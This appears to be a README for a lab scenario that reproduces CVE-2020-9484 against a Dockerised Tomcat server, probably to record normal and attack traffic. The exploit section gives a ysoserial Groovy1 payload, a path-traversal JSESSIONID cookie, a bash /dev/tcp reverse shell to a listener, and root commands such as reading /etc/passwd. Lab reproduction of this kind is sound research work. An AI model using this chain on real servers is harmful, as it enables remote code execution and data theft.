# CVE-2020-9484 Tomcat Deserialization

## Description / Overview of Scenario

If a Apache Tomcat Server of certain versions is used configured in a specific way (described below)an attacker can trigger an remote code execution via deserialization with a crafted request.

## victim:

Docker container base from https://github.com/masahiro331/CVE-2020-9484.

uploading-migrated.war is custom webapplication to upload and show files.
groovy-2.3.9.jar is vulnerable webapplication implementing the following flaws.

Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103
Following things must be true for the vulnerability to be accessible:
* The server is configured to use the PersistenceManager with a FileStore; and
* The PersistenceManager is configured with sessionAttributeValueClassNameFilter="null" (the default unless a SecurityManager is used) or a sufficiently lax filter to allow the attacker provided object to be deserialized; and
* An attacker is able to control the contents and name of a file on the server; and
* The attacker knows the relative file path from the storage location used by FileStore to the file the attacker has control over;
    https://nvd.nist.gov/vuln/detail/CVE-2020-9484

Includes a uploading and downloading web application written with Spring boot (war file).

Steps to reproduce web application file:

* Clone example web application from 
    git clone https://github.com/spring-guides/gs-uploading-files.git
* Follow tutorial at: https://spring.io/guides/gs/uploading-files/

* Change needed things to create war file
    * Add:
      ```xml
        <packaging>war</packaging>
        <dependencies>
            ...
            <dependency>
               <groupId>org.springframework.boot</groupId>
               <artifactId>spring-boot-starter-tomcat</artifactId>
               <scope>provided</scope>
           </dependency>
           ...
        </dependencies>
        ```
        
   *  In Application.java add:
        ```javascript
        import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;

        public class Application extends SpringBootServletInitializer{
            ...
            @Override
            protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
                 return application.sources(Application.class);
            }
        }
        ```


* Compile in /initial with ./mvnw clean package

* Convert application to be able to run unter Tomcat 10

    * Download migration tool: https://tomcat.apache.org/download-migration.cgi
    * and run in initial/target:
            
            java -jar jakartaee-migration-*-shaded.jar uploading.war uploading-migrated.war 

## normal
Upload and download files from victim.
Uploaded files are txt files filled with random strings, so sizes differ.

## exploit:

Uploading a crafted payload created with ysoserial.jar. 

It is possible to send crafted POST request with JSESSIONID set to a specific path.

The Victim then tries to load a SessionID which is not available.

Because of the PersistanceManager a Session is loaded from the specified path.

E.g: 
    
    Cookie : "JSESSIONID=../../../../upload-dir/executePayload.session"
This session is then deserialized and enables remote code execution as root user.
With ysoserial and the following command a malicious binary is created.

Create payload with reverse shell

    #!/usr/bin/bash
    echo "bash -i >& /dev/tcp/{ip}/4444 0>&1"
    
Run the payload uploaded through the website.

    java -jar ysoserial.jar Groovy1 'bash /tmp/payload.sh' > executePayload.session
    
Start listener and wait for connection from victim.

Send the following to test connection and then make use of root rights.
    
    whoami
    cat /etc/passwd

## cli:

    sudo python3 main.py a b c
    
    a: boolean (0/1) run automated normal behavior
    b: integer recording time
       1-n: recording time in seconds
        -1: flag to run auto stop of recording after end of exploit
    c: boolean (0/1) run automated exploit
